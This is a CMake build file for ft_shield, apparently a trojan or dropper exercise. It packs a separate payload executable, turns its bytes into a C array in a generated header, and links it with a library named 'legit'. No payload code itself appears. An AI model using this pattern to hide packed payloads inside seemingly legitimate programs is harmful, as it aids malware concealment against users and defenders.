# add_compile_options(-fsanitize=address -Wall -Wextra -g3)
# add_link_options(-fsanitize=address -Wall -Wextra -g3)

add_executable(ft_shield)

target_sources(ft_shield
	PRIVATE main.c
)

# add executable sources
add_subdirectory(packer)
add_subdirectory(payload)
add_subdirectory(legit)

# handle packer and payload here..
set(PACKER_EXEC "${CMAKE_BINARY_DIR}/ft_shield/packer/src/packer")
set(PAYLOAD_EXEC "${CMAKE_BINARY_DIR}/ft_shield/payload/payload")
set(PACKED_PAYLOAD_EXEC_OUT "${CMAKE_BINARY_DIR}/ft_shield/packed_payload")
set(GENERATED_HEADER "${CMAKE_CURRENT_BINARY_DIR}/payload_info.h")


if(APPLE)
    add_custom_target(pack_payload
        COMMAND cp ${PAYLOAD_EXEC} ${PACKED_PAYLOAD_EXEC_OUT}
        COMMENT "Packer does not support APPLE, skipping packing.."
    )
else()
    add_custom_target(pack_payload
        COMMAND ${PACKER_EXEC} ${PAYLOAD_EXEC} ${PACKED_PAYLOAD_EXEC_OUT}
        COMMENT "Packing payload executable.."
    )
endif()

set(BYTES_CMD "xxd -c 16 -g 4 -i ${PACKED_PAYLOAD_EXEC_OUT} | sed -e 's/^unsigned char .*/unsigned char PAYLOAD_BYTES[] = {/' \ -e 's/^unsigned int .*_len/unsigned int PAYLOAD_LEN/' ")
# cant use add_custom_target here becase it will check for its dependencies (PACKED_PAYLOAD_EXEC_OUT) on configure time, which does not exist yet
add_custom_command(
    OUTPUT "${GENERATED_HEADER}"
    COMMAND sh -c "${BYTES_CMD} > '${GENERATED_HEADER}'"
    
    # this ensures it runs after pack_payload updates the file
    DEPENDS pack_payload
    VERBATIM
    COMMENT "Extracting file bytes..."
)

# chain dependencies
add_dependencies(pack_payload packer payload)
add_dependencies(ft_shield pack_payload)

target_link_libraries(ft_shield
  PRIVATE
    legit
)

target_sources(ft_shield
    PRIVATE 
        main.c
		"${GENERATED_HEADER}" # tracked by the custom command

)
target_include_directories(ft_shield PRIVATE "${CMAKE_CURRENT_BINARY_DIR}")
